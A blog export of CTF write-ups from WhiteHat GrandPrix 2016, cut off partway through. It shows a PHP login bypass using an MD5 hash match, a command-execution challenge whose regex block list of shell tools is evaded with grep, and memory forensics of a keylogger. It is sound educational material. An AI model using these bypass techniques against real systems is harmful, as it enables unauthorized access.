Name : WhiteHat GrandPrix 2016 Website : grandprix.whitehatvn.com Type : Online Format : Jeopardy CTF Time : link Description http://web05.grandprix.whitehatvn.com http://bakweb05.grandprix.whitehatvn.com:8125 Solution Here is the home page: The login link go to http://web05.grandprix.whitehatvn.com/index.php?username=guest&amp;password=guest and says noob. Let's see source code of teh web page: 123456&lt;html&gt; &lt;title&gt;hello&lt;/title&gt; &lt;body&gt; &lt;a href='index.php?username=guest&amp;password=guest'&gt;login&lt;/a&gt;&lt;br&gt; &lt;/body&gt;Login to get our secret&lt;/html&gt;&lt;!-- index.php.bak --&gt; Ok, let's see index.php.bak: 12345678910111213141516171819202122&lt;?php function checklogin($username, $password, $key, $secret) &#123; if($username.$key == md5($password)) echo $secret; else echo \"noob\"; &#125;$key = \"1337\";$secret = \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\";echo \"&lt;html&gt; &lt;title&gt;hello&lt;/title&gt; &lt;body&gt; &lt;a href='index.php?username=guest&amp;password=guest'&gt;login&lt;/a&gt;&lt;br&gt; &lt;/body&gt;\";if (isset($_GET['username'])&amp;&amp;isset($_GET['password'])) &#123; checklogin($_GET['username'],$_GET['password'],$key,$secret); die(0); &#125;echo \"Login to get our secret\";echo \"&lt;/html&gt;\";?&gt; Ok so the login checks that the concatenation of the username and the key is equal to the md5 hash of the password. So we need to find a hash like ????????????????????????????1337 (28 random hex chars and 1337). I first thought to download a md5 hash dictionary but I didn't wanted to wait during teh download. So I went to md5db.net and looked for a hash beginning with 0000, did a CTRL + F to find 1337 and finaly found one: # 13381 Hash 0000dd456d15560290351cb4e6311337 Word hdtfz. So we get: username: 0000dd456d15560290351cb4e631 key: 1337 password: hdtfz I submited the url: http://web05.grandprix.whitehatvn.com/index.php?username=0000dd456d15560290351cb4e631&amp;password=hdtfz and got the flag WhiteHat{92ab818618fee438a1ea3944b5940237975f2b1d}. Submit","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"WhiteHat GrandPrix - 100 - Banh da Ke - Misc","slug":"WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke","date":"2016-12-16T23:00:00.000Z","updated":"2017-02-07T18:23:36.732Z","comments":true,"path":"en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-GrandPrix-2016-misc-100-Banh-da-Ke/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : WhiteHat GrandPrix 2016 Website : grandprix.whitehatvn.com Type : Online Format : Jeopardy CTF Time : link Description When you gather all part of flag. Let's submit: WhiteHat{SHA1(flag)} nc misc04.grandprix.whitehatvn.com 23403 nc bakmisc04.grandprix.whitehatvn.com 23403 http://material.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip http://bakmaterial.grandprix.whitehatvn.com/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip Alternative server on amazon in case of low traffic: http://54.183.97.137/gp2016/Misc04_be5358f2cb135ae9a38665a0d5ff199fc4fabb47.zip create_folder_player.py 12345678910111213141516171819import osimport randomflag = \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"count = 0length = len(flag)print lengtharr = random.sample(range(0,10000),length)arr = sorted(arr)for k in range(0,10000): try: os.mkdir(str(k)) except: pass if k in arr: f=open(\"./\"+str(k)+\"/\"+os.urandom(8).encode(\"hex\")+\".\"+os.urandom(8).encode(\"hex\"),\"w\").write(str(flag[count])) count +=1 mics.py 12345678910111213141516171819202122232425#!/usr/bin/env pythonimport osimport reimport sysblaclist = \"cat|nano|less|tail|vim|head|apt|install|wget|more|emacs|vi|subl|pico|bash|sh|rm|sed|nl|flag.hihi|`|%|\\$|chmod|python\"myregrex = \"\\W*(?i)(\"+blaclist+\")\\W*\"cmd = \"\"while(cmd != \"exit\"): sys.stdout.write(\"Input your command: \\n\") sys.stdout.flush() cmd = raw_input() check = re.findall(myregrex,cmd) if check!=[]: sys.stdout.write(\"rejected\\n\") sys.stdout.flush() continue try: #call() a =\"XXXXXXXXXXXXX\" a+=cmd os.system(a) except: sys.stdout.write(\"bad command\\n\") sys.stdout.flush() Solution create_folder_player.py: there will be 10000 folders with one part of the flag in several of them choosen randomly. misc.py: lol, the spell. blaclist vs blacklist. misc.py: ok seriously, blacklist usage sucks so I wont do a script to send a ls for the all 10000 folders. I will simply find a command not blacklisted: grep. grep is magic, you can use all kind of regex and use it recursively: 12345678910111213141516171819202122232425262728293031323334Input your command:grep -r -E &apos;*.*&apos; ../5256/7e8e1adc2c27d5ae.b20d7fe2eeee83a6:e./5363/049185c04d8d4a6a.14b749db725281b6:p./9149/e60247d6e9b86d66.538088287218f418:h./6625/99c4b89e33717d68.4e7cfddc3ab792ab:m./2961/af1fa87c94746adc.4ceba2ad4425295a:H./5360/3b1d1d39b7cdfc5e.b3d700c19f7da568:3./7520/be92bc1c03188333.8a0acf56d05e21f2:D./9460/0990eb1ff5a0f0f4.2b8448627eda707d:4./7261/85c5e9b11412182b.c8aa64a3e89d6116:4./4464/bfb49af4d0d18330.0e0a92989ea0cd16:&#123;./8447/1383404de7cf99d1.801ee7e580554bf7:r./9817/abb9dad1b91251c0.8aca51ae85b0a5a3:&#125;./2464/91001f84e6b7043c.362d39207f7113d5:e./6089/0da7f2cf81b578bc.64aceb97e90d59b8:4./7265/0d1d93183a71652c.f62fd332e6a893c7:n./8042/45b7f42e37a7036d.4649801c191cd850:t./8566/eb0eac89c6af6941.a01ee5abd0018d64:y./1490/ce66a0652ef071e2.8e59cb623f5044db:i./3391/d5bb02174118cd0a.8452e896dc972780:a./9729/ff958bf095684403.ba220df0c0a00cbc:d./5627/39835fcae4e0fb1e.d63a2b4f7cd6cc4d:_./5754/01b98e405d1a6f5e.dfea13f68bf1d28c:c./2124/0388bdb00dff778b.cf361e5e8cba7330:t./8919/8b998e1b2d84792e.05c56576bc8a640c:_./251/01fbe27318a591b2.32905c5f1c5d5be2:W./6805/421c3e7b161f09e6.cb2d792b88d852d3:_./7615/40672c2915963dc7.23d290b7ab5a23fe:_./4983/29a3e67904c136c1.82698942425d3172:k./4091/5d4d11679777c463.54a739cf22f2147f:t./1477/76ed9a66da76f47c.fffc5ebba341f304:h./6428/4ab16af8f7bea2ca.f326ac02efddd099:l./9664/3a309f1c601603e8.949523481193df68:r Save the output in a text file. Let's order that with a ruby script: 123456789101112131415161718#!/usr/bin/rubyarr = []File.open('misc04.txt').each do |line| # math the folderName, fileName and content of each file (one char) regex = line.match(/\\/([0-9]&#123;1,4&#125;)\\/([a-f0-9]&#123;16&#125;\\.[a-f0-9]&#123;16&#125;):(.)/) folderName = regex.captures[0] fileName = regex.captures[1] char = regex.captures[2] # convert folderName to int in order to be able to sort it the right way. Sort as int (2464 &gt; 251), sort a string (2464 &lt; 251). arr.push([folderName.to_i,fileName,char])end# sort by first col, so sort by fileNamearr.sort!# display only chars (third column of each row)arr.each&#123;|r| print r[2]&#125; Execute it: 123[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ ruby sorted.rbWhiteHat&#123;ke3p_c4lm_4nD_try_h4rd&#125; Format the flag (WhiteHat{SHA1(flag)}): 123[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ printf %s &apos;WhiteHat&#123;ke3p_c4lm_4nD_try_h4rd&#125;&apos; | sha1sum1a05093adb0795d8e2f5b89985c43b85bcb11d19 - Submt the flag WhiteHat{1a05093adb0795d8e2f5b89985c43b85bcb11d19}. Submit Another piece of the puzzle:","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"WhiteHat GrandPrix - 300 - Banh it la gai - Forensics","slug":"WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai","date":"2016-12-16T23:00:00.000Z","updated":"2017-02-07T18:23:36.722Z","comments":true,"path":"en/WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-300-Banh-it-la-gai/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : WhiteHat GrandPrix 2016 Website : grandprix.whitehatvn.com Type : Online Format : Jeopardy CTF Time : link Description Submit: WhiteHat{SHA1(flag)} http://material.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip http://bakmaterial.grandprix.whitehatvn.com/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip Alternative server on amazon in case of low traffic: http://54.183.97.137/gp2016/For02_3603cb82230e3f6eb669a65f455e92b74659c2cc.zip Solution TL;DR: incomplete write-up. Download the zip. Extract it. We have a raw image. Let's see what we can do with Volatility: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ volatility -f bkav5.raw imageinfoVolatility Foundation Volatility Framework 2.5INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/home/noraj/CTF/WhiteHat_GrandPrix/2016/For2/bkav5.raw) PAE type : PAE DTB : 0x334000L KDBG : 0x8054d2e0L Number of Processors : 2 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KPCR for CPU 1 : 0xfd24c000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2016-11-06 16:47:44 UTC+0000 Image local date and time : 2016-11-06 23:47:44 +0700[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ volatility -f bkav5.raw --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.5Name Pid PPid Thds Hnds Time-------------------------------------------------- ------ ------ ------ ------ ----0x8107e020:System 4 0 60 228 1970-01-01 00:00:00 UTC+0000. 0xff596808:smss.exe 544 4 3 17 2016-11-06 16:44:22 UTC+0000.. 0xff4b4da0:winlogon.exe 644 544 25 524 2016-11-06 16:44:23 UTC+0000... 0xff609998:services.exe 744 644 13 246 2016-11-06 16:44:25 UTC+0000.... 0xff4a3d70:vmacthlp.exe 928 744 1 25 2016-11-06 16:44:26 UTC+0000.... 0xff67a7e8:spoolsv.exe 1600 744 6 54 2016-11-06 16:47:21 UTC+0000.... 0xff5cfda0:svchost.exe 992 744 10 178 2016-11-06 16:44:27 UTC+0000.... 0xff583888:svchost.exe 1348 744 6 119 2016-11-06 16:44:27 UTC+0000.... 0xff59a7b8:svchost.exe 944 744 7 122 2016-11-06 16:44:26 UTC+0000.... 0x80fdec10:svchost.exe 180 744 5 88 2016-11-06 16:44:45 UTC+0000.... 0xff481020:svchost.exe 1876 744 15 194 2016-11-06 16:47:07 UTC+0000.... 0xff58c7b8:svchost.exe 1244 744 5 59 2016-11-06 16:44:27 UTC+0000... 0xff5be460:lsass.exe 760 644 25 332 2016-11-06 16:44:25 UTC+0000.. 0xff5974d8:csrss.exe 616 544 10 265 2016-11-06 16:44:22 UTC+00000x80ecf928:explorer.exe 1740 1704 17 424 2016-11-06 16:44:32 UTC+0000. 0xff5bf138:DumpIt.exe 308 1740 1 27 2016-11-06 16:47:42 UTC+0000. 0x80eb7690:rundll32.exe 1884 1740 4 72 2016-11-06 16:44:37 UTC+0000. 0xff5b2888:keylog.exe 2020 1740 2 35 2016-11-06 16:47:17 UTC+0000[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ volatility -f bkav5.raw --profile=WinXPSP2x86 procdump -p 2020 --dump-dir=.Volatility Foundation Volatility Framework 2.5Process(V) ImageBase Name Result---------- ---------- -------------------- ------0xff5b2888 0x00400000 keylog.exe OK: executable.2020.exe See a supicious keylog.exe so we dumped it. Upload it to Virustotal and to Hybrid Analysis. Detection ratio: 4 / 56, a keylogger. Just look for quick win: 123456789[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ strings keylog.exe_executable.2020.exe[...]%c - %dc:/windows/keylog.log[WIN][...] The malware is saving its collected informations in c:/windows/keylog.log. Let's find the file and dump it: 123456789101112[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ volatility -f bkav5.raw --profile=WinXPSP2x86 filescan | grep -i &apos;keylog.log&apos;Volatility Foundation Volatility Framework 2.5Offset(P) #Ptr #Hnd Access Name------------------ ------ ------ ------ ----0x00000000010410a0 1 0 RW-rw- \\Device\\HarddiskVolume1\\WINDOWS\\keylog.log[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ volatility -f bkav5.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000010410a0 --dump-dir=.Volatility Foundation Volatility Framework 2.5DataSectionObject 0x010410a0 None \\Device\\HarddiskVolume1\\WINDOWS\\keylog.log But this is a non standard encoding: 1234567891011121314151617181920212223242526272829303132333435363738[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ file keylog.log_file.None.0x80eb7008.datkeylog.log_file.None.0x80eb7008.dat: Non-ISO extended-ASCII text, with NEL line terminators[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ xxd keylog.log_file.None.0x80eb7008.dat00000000: 8589 9790 83bd b3ba 859b b0aa bbac 83b6 ................00000010: bbb2 b2b1 859b b0aa bbac 83a9 bbb2 b2b1 ................00000020: 859c 9f9d 958d 8e9f 9d9b 83bd b1b3 bbfe ................00000030: a7b1 abfe b9ab a7ff 859c 9f9d 958d 8e9f ................00000040: 9d9b 83fe e185 9bb0 aabb ac83 a9bb b2fe ................00000050: b1ac fea9 bbb2 b2fe e185 9bb0 aabb ac83 ................00000060: a9b6 bfaa bbac a8bb acfe 869a 859b b0aa ................00000070: bbac 8385 8997 9083 bdb6 acb1 b3bb 859b ................00000080: b0aa bbac 83a9 bbb2 feb1 ac85 9c9f 9d95 ................00000090: 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b ................000000a0: 8385 9c9f 9d95 8d8e 9f9d 9b83 b2bd b1b3 ................000000b0: bbfe b1ac fea9 bbb2 bdb1 b3bb 859b b0aa ................000000c0: bbac 83ab b6b3 fef0 f0f0 fe85 9c9f 9d95 ................000000d0: 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b ................000000e0: 8385 9c9f 9d95 8d8e 9f9d 9b83 859c 9f9d ................000000f0: 958d 8e9f 9d9b 8385 9c9f 9d95 8d8e 9f9d ................00000100: 9b83 859c 9f9d 958d 8e9f 9d9b 8385 9c9f ................00000110: 9d95 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f ................00000120: 9d9b 8385 9c9f 9d95 8d8e 9f9d 9b83 859c ................00000130: 9f9d 958d 8e9f 9d9b 8385 9c9f 9d95 8d8e ................00000140: 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b 8385 ................00000150: 9c9f 9d95 8d8e 9f9d 9b83 b7fe b9b1 aafe ................00000160: b7aa fef0 feaa b6bf aafe a9bb b2bd b1b3 ................00000170: bbfe e49a 859d aaac b283 aab8 bf85 9bb0 ................00000180: aabb ac83 859d aaac b283 aab8 bdbb b1b1 ................00000190: b5f0 bdb1 b385 9bb0 aabb ac83 aab6 b7ad ................000001a0: b7ad b3a7 b8b2 bfb9 d7a5 a385 92bb b8aa ................000001b0: 9fac acb1 a983 b5ba b7bb b5b5 bab7 eced ................000001c0: e7ed e9ba b8b6 ede7 b4ad b2ad bab5 e7ed ................000001d0: 859b b0aa bbac 83aa b6bf b0b5 a7b1 abff ................000001e0: 859b b0aa bbac 83e4 9abf bcbd babb b8b9 ................000001f0: b6b7 b5b2 b3b0 b1ae afac adaa e1e1 e1a7 ................ This is nor UTF-8, nor WINDOWS-1252/C1252. Try to determine what kind of encoding this is (source: superuser.com): 123456$ iconv --list | sed &apos;s/\\/\\/$//&apos; | sort &gt; encodings.list$ for a in `cat encodings.list`; doprintf &quot;$a &quot;iconv -f $a -t UTF-8 keylog.log_file.None.0x80eb7008.dat &gt; /dev/null 2&gt;&amp;1 \\&amp;&amp; echo &quot;ok: $a&quot; || echo &quot;fail: $a&quot;done | tee result.txt Let's take a look at results: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934941026 ok: 10261047 ok: 1047437 ok: 437500 ok: 500500V1 ok: 500V1850 ok: 850851 ok: 851852 ok: 852855 ok: 855860 ok: 860861 ok: 861862 ok: 862863 ok: 863865 ok: 865866 ok: 866866NAV ok: 866NAV8859_1 ok: 8859_18859_2 ok: 8859_28859_4 ok: 8859_48859_5 ok: 8859_58859_9 ok: 8859_9BALTIC ok: BALTICCP037 ok: CP037CP10007 ok: CP10007CP1025 ok: CP1025CP1026 ok: CP1026CP1047 ok: CP1047CP1070 ok: CP1070CP1079 ok: CP1079CP1081 ok: CP1081CP1084 ok: CP1084CP1097 ok: CP1097CP1112 ok: CP1112CP1122 ok: CP1122CP1123 ok: CP1123CP1124 ok: CP1124CP1125 ok: CP1125CP1129 ok: CP1129CP1130 ok: CP1130CP1137 ok: CP1137CP1140 ok: CP1140CP1141 ok: CP1141CP1142 ok: CP1142CP1143 ok: CP1143CP1144 ok: CP1144CP1145 ok: CP1145CP1146 ok: CP1146CP1147 ok: CP1147CP1148 ok: CP1148CP1149 ok: CP1149CP1153 ok: CP1153CP1154 ok: CP1154CP1155 ok: CP1155CP1156 ok: CP1156CP1157 ok: CP1157CP1158 ok: CP1158CP1160 ok: CP1160CP1163 ok: CP1163CP1164 ok: CP1164CP1166 ok: CP1166CP1167 ok: CP1167CP1251 ok: CP1251CP1256 ok: CP1256CP1282 ok: CP1282CP1390 ok: CP1390CP1399 ok: CP1399CP273 ok: CP273CP278 ok: CP278CP280 ok: CP280CP282 ok: CP282CP284 ok: CP284CP285 ok: CP285CP297 ok: CP297CP437 ok: CP437CP500 ok: CP500CP5347 ok: CP5347CP737 ok: CP737CP770 ok: CP770CP771 ok: CP771CP772 ok: CP772CP773 ok: CP773CP774 ok: CP774CP775 ok: CP775CP819 ok: CP819CP850 ok: CP850CP851 ok: CP851CP852 ok: CP852CP855 ok: CP855CP860 ok: CP860CP861 ok: CP861CP862 ok: CP862CP863 ok: CP863CP865 ok: CP865CP866 ok: CP866CP866NAV ok: CP866NAVCP870 ok: CP870CP871 ok: CP871CP880 ok: CP880CP901 ok: CP901CP902 ok: CP902CP9030 ok: CP9030CP912 ok: CP912CP915 ok: CP915CP920 ok: CP920CP921 ok: CP921CP922 ok: CP922CP9448 ok: CP9448CP-HU ok: CP-HUCPIBM861 ok: CPIBM861CSIBM037 ok: CSIBM037CSIBM1025 ok: CSIBM1025CSIBM1026 ok: CSIBM1026CSIBM1097 ok: CSIBM1097CSIBM1112 ok: CSIBM1112CSIBM1122 ok: CSIBM1122CSIBM1123 ok: CSIBM1123CSIBM1124 ok: CSIBM1124CSIBM1129 ok: CSIBM1129CSIBM1130 ok: CSIBM1130CSIBM1137 ok: CSIBM1137CSIBM1140 ok: CSIBM1140CSIBM1141 ok: CSIBM1141CSIBM1142 ok: CSIBM1142CSIBM1143 ok: CSIBM1143CSIBM1144 ok: CSIBM1144CSIBM1145 ok: CSIBM1145CSIBM1146 ok: CSIBM1146CSIBM1147 ok: CSIBM1147CSIBM1148 ok: CSIBM1148CSIBM1149 ok: CSIBM1149CSIBM1153 ok: CSIBM1153CSIBM1154 ok: CSIBM1154CSIBM1155 ok: CSIBM1155CSIBM1156 ok: CSIBM1156CSIBM1157 ok: CSIBM1157CSIBM1158 ok: CSIBM1158CSIBM1160 ok: CSIBM1160CSIBM1163 ok: CSIBM1163CSIBM1164 ok: CSIBM1164CSIBM1166 ok: CSIBM1166CSIBM1167 ok: CSIBM1167CSIBM1390 ok: CSIBM1390CSIBM1399 ok: CSIBM1399CSIBM273 ok: CSIBM273CSIBM277 ok: CSIBM277CSIBM278 ok: CSIBM278CSIBM280 ok: CSIBM280CSIBM284 ok: CSIBM284CSIBM285 ok: CSIBM285CSIBM297 ok: CSIBM297CSIBM500 ok: CSIBM500CSIBM5347 ok: CSIBM5347CSIBM851 ok: CSIBM851CSIBM855 ok: CSIBM855CSIBM860 ok: CSIBM860CSIBM863 ok: CSIBM863CSIBM865 ok: CSIBM865CSIBM866 ok: CSIBM866CSIBM870 ok: CSIBM870CSIBM871 ok: CSIBM871CSIBM880 ok: CSIBM880CSIBM901 ok: CSIBM901CSIBM902 ok: CSIBM902CSIBM9030 ok: CSIBM9030CSIBM921 ok: CSIBM921CSIBM922 ok: CSIBM922CSIBM9448 ok: CSIBM9448CSISO111ECMACYRILLIC ok: CSISO111ECMACYRILLICCSISO139CSN369103 ok: CSISO139CSN369103CSISO143IECP271 ok: CSISO143IECP271CSISOLATIN1 ok: CSISOLATIN1CSISOLATIN2 ok: CSISOLATIN2CSISOLATIN4 ok: CSISOLATIN4CSISOLATIN5 ok: CSISOLATIN5CSISOLATIN6 ok: CSISOLATIN6CSISOLATINCYRILLIC ok: CSISOLATINCYRILLICCSKOI8R ok: CSKOI8RCSMACINTOSH ok: CSMACINTOSHCSN_369103 ok: CSN_369103CSPC775BALTIC ok: CSPC775BALTICCSPC850MULTILINGUAL ok: CSPC850MULTILINGUALCSPC862LATINHEBREW ok: CSPC862LATINHEBREWCSPC8CODEPAGE437 ok: CSPC8CODEPAGE437CSPCP852 ok: CSPCP852CSUNICODE ok: CSUNICODECWI ok: CWICWI-2 ok: CWI-2CYRILLIC ok: CYRILLICEBCDIC-CP-BE ok: EBCDIC-CP-BEEBCDIC-CP-CA ok: EBCDIC-CP-CAEBCDIC-CP-CH ok: EBCDIC-CP-CHEBCDIC-CP-DK ok: EBCDIC-CP-DKEBCDIC-CP-ES ok: EBCDIC-CP-ESEBCDIC-CP-FI ok: EBCDIC-CP-FIEBCDIC-CP-FR ok: EBCDIC-CP-FREBCDIC-CP-GB ok: EBCDIC-CP-GBEBCDIC-CP-IS ok: EBCDIC-CP-ISEBCDIC-CP-IT ok: EBCDIC-CP-ITEBCDIC-CP-NL ok: EBCDIC-CP-NLEBCDIC-CP-NO ok: EBCDIC-CP-NOEBCDIC-CP-ROECE ok: EBCDIC-CP-ROECEEBCDIC-CP-SE ok: EBCDIC-CP-SEEBCDIC-CP-US ok: EBCDIC-CP-USEBCDIC-CP-WT ok: EBCDIC-CP-WTEBCDIC-CP-YU ok: EBCDIC-CP-YUEBCDIC-CYRILLIC ok: EBCDIC-CYRILLICEBCDIC-INT1 ok: EBCDIC-INT1ECMA-128 ok: ECMA-128ECMACYRILLIC ok: ECMACYRILLICECMA-CYRILLIC ok: ECMA-CYRILLICGEORGIAN-ACADEMY ok: GEORGIAN-ACADEMYGEORGIAN-PS ok: GEORGIAN-PSIBM037 ok: IBM037IBM1025 ok: IBM1025IBM-1025 ok: IBM-1025IBM1026 ok: IBM1026IBM1047 ok: IBM1047IBM-1047 ok: IBM-1047IBM1097 ok: IBM1097IBM-1097 ok: IBM-1097IBM1112 ok: IBM1112IBM-1112 ok: IBM-1112IBM1122 ok: IBM1122IBM-1122 ok: IBM-1122IBM1123 ok: IBM1123IBM-1123 ok: IBM-1123IBM1124 ok: IBM1124IBM-1124 ok: IBM-1124IBM1129 ok: IBM1129IBM-1129 ok: IBM-1129IBM1130 ok: IBM1130IBM-1130 ok: IBM-1130IBM1137 ok: IBM1137IBM-1137 ok: IBM-1137IBM1140 ok: IBM1140IBM-1140 ok: IBM-1140IBM1141 ok: IBM1141IBM-1141 ok: IBM-1141IBM1142 ok: IBM1142IBM-1142 ok: IBM-1142IBM1143 ok: IBM1143IBM-1143 ok: IBM-1143IBM1144 ok: IBM1144IBM-1144 ok: IBM-1144IBM1145 ok: IBM1145IBM-1145 ok: IBM-1145IBM1146 ok: IBM1146IBM-1146 ok: IBM-1146IBM1147 ok: IBM1147IBM-1147 ok: IBM-1147IBM1148 ok: IBM1148IBM-1148 ok: IBM-1148IBM1149 ok: IBM1149IBM-1149 ok: IBM-1149IBM1153 ok: IBM1153IBM-1153 ok: IBM-1153IBM1154 ok: IBM1154IBM-1154 ok: IBM-1154IBM1155 ok: IBM1155IBM-1155 ok: IBM-1155IBM1156 ok: IBM1156IBM-1156 ok: IBM-1156IBM1157 ok: IBM1157IBM-1157 ok: IBM-1157IBM1158 ok: IBM1158IBM-1158 ok: IBM-1158IBM1160 ok: IBM1160IBM-1160 ok: IBM-1160IBM1163 ok: IBM1163IBM-1163 ok: IBM-1163IBM1164 ok: IBM1164IBM-1164 ok: IBM-1164IBM1166 ok: IBM1166IBM-1166 ok: IBM-1166IBM1167 ok: IBM1167IBM-1167 ok: IBM-1167IBM1390 ok: IBM1390IBM-1390 ok: IBM-1390IBM1399 ok: IBM1399IBM-1399 ok: IBM-1399IBM256 ok: IBM256IBM273 ok: IBM273IBM277 ok: IBM277IBM278 ok: IBM278IBM280 ok: IBM280IBM284 ok: IBM284IBM285 ok: IBM285IBM297 ok: IBM297IBM437 ok: IBM437IBM500 ok: IBM500IBM5347 ok: IBM5347IBM-5347 ok: IBM-5347IBM775 ok: IBM775IBM819 ok: IBM819IBM848 ok: IBM848IBM850 ok: IBM850IBM851 ok: IBM851IBM852 ok: IBM852IBM855 ok: IBM855IBM860 ok: IBM860IBM861 ok: IBM861IBM862 ok: IBM862IBM863 ok: IBM863IBM865 ok: IBM865IBM866 ok: IBM866IBM866NAV ok: IBM866NAVIBM870 ok: IBM870IBM871 ok: IBM871IBM880 ok: IBM880IBM901 ok: IBM901IBM-901 ok: IBM-901IBM902 ok: IBM902IBM-902 ok: IBM-902IBM9030 ok: IBM9030IBM-9030 ok: IBM-9030IBM912 ok: IBM912IBM915 ok: IBM915IBM920 ok: IBM920IBM921 ok: IBM921IBM-921 ok: IBM-921IBM922 ok: IBM922IBM-922 ok: IBM-922IBM9448 ok: IBM9448IBM-9448 ok: IBM-9448IEC_P271 ok: IEC_P271IEC_P27-1 ok: IEC_P27-1ISO-10646/UCS2/ ok: ISO-10646/UCS2/ISO_11548-1 ok: ISO_11548-1ISO11548-1 ok: ISO11548-1ISO6937 ok: ISO6937ISO_6937 ok: ISO_6937ISO_6937:1992 ok: ISO_6937:1992ISO88591 ok: ISO88591ISO_8859-1 ok: ISO_8859-1ISO-8859-1 ok: ISO-8859-1ISO8859-1 ok: ISO8859-1ISO885910 ok: ISO885910ISO_8859-10 ok: ISO_8859-10ISO-8859-10 ok: ISO-8859-10ISO8859-10 ok: ISO8859-10ISO_8859-10:1992 ok: ISO_8859-10:1992ISO_8859-1:1987 ok: ISO_8859-1:1987ISO885913 ok: ISO885913ISO-8859-13 ok: ISO-8859-13ISO8859-13 ok: ISO8859-13ISO885914 ok: ISO885914ISO_8859-14 ok: ISO_8859-14ISO-8859-14 ok: ISO-8859-14ISO8859-14 ok: ISO8859-14ISO_8859-14:1998 ok: ISO_8859-14:1998ISO885915 ok: ISO885915ISO_8859-15 ok: ISO_8859-15ISO-8859-15 ok: ISO-8859-15ISO8859-15 ok: ISO8859-15ISO_8859-15:1998 ok: ISO_8859-15:1998ISO885916 ok: ISO885916ISO_8859-16 ok: ISO_8859-16ISO-8859-16 ok: ISO-8859-16ISO8859-16 ok: ISO8859-16ISO_8859-16:2001 ok: ISO_8859-16:2001ISO88592 ok: ISO88592ISO_8859-2 ok: ISO_8859-2ISO-8859-2 ok: ISO-8859-2ISO8859-2 ok: ISO8859-2ISO_8859-2:1987 ok: ISO_8859-2:1987ISO88594 ok: ISO88594ISO_8859-4 ok: ISO_8859-4ISO-8859-4 ok: ISO-8859-4ISO8859-4 ok: ISO8859-4ISO_8859-4:1988 ok: ISO_8859-4:1988ISO88595 ok: ISO88595ISO_8859-5 ok: ISO_8859-5ISO-8859-5 ok: 